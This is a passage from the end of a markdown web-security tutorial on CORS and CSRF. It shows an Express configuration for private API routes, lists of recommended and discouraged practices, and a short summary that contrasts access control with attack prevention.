  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
});

app.use('/api/private', privateCors);

app.get('/api/private/user', authenticate, (req, res) => {
  res.json(req.user); // Protected
});
```

**Key Insight:**
> `Access-Control-Allow-Origin: *` = "Any website can access this". Only safe for public, non-authenticated, read-only APIs. Always use specific origins for sensitive endpoints.

---

## ✅ Best Practices Summary

### ✅ Do's

**CORS:**
1. **Whitelist specific origins** in production
2. **Use `*` only for public APIs** (no auth, no sensitive data)
3. **Enable credentials** only for trusted origins
4. **Set appropriate methods** (don't allow all)
5. **Cache preflight** requests (Access-Control-Max-Age)
6. **Validate origins** on server-side
7. **Use environment variables** for origin lists

**CSRF:**
1. **Use SameSite cookies** (Lax or Strict)
2. **Implement CSRF tokens** for state-changing operations
3. **Require custom headers** for API requests
4. **Validate Origin/Referer** headers
5. **Use HTTPS** always (required for SameSite=None)
6. **Protect state-changing** operations (POST, PUT, DELETE)
7. **Regenerate tokens** after login

### ❌ Don'ts

**CORS:**
1. **Don't use `*` with credentials**
2. **Don't allow all origins** for authenticated APIs
3. **Don't trust client-side** CORS configuration
4. **Don't expose sensitive** endpoints publicly
5. **Don't skip origin** validation
6. **Don't allow all methods** unnecessarily
7. **Don't forget preflight** handling

**CSRF:**
1. **Don't rely solely on** Origin/Referer (can be bypassed)
2. **Don't skip CSRF protection** for cookie-based auth
3. **Don't use GET** for state-changing operations
4. **Don't trust CORS** to prevent CSRF
5. **Don't reuse tokens** across sessions
6. **Don't expose tokens** in URLs
7. **Don't forget mobile apps** need CSRF protection too

---

## 🎯 Summary

- **CORS** controls cross-origin access (enables legitimate use)
- **CSRF** prevents cross-origin attacks (blocks malicious use)
- **Different problems:** CORS = access control, CSRF = attack prevention
- **Often used together:** Strict CORS + CSRF tokens = defense-in-depth
- **CORS wildcard (`*`)** safe for public APIs only
- **CSRF protection** required for cookie-based authentication
- **JWT in header** = No CSRF needed (safe by design)
- **SameSite cookies** = Modern CSRF protection
- **Best practice:** Whitelist origins + CSRF tokens + SameSite cookies

---

[← Back to Backend](../README.md) | [Next: Input Validation →](./06-validation.md)
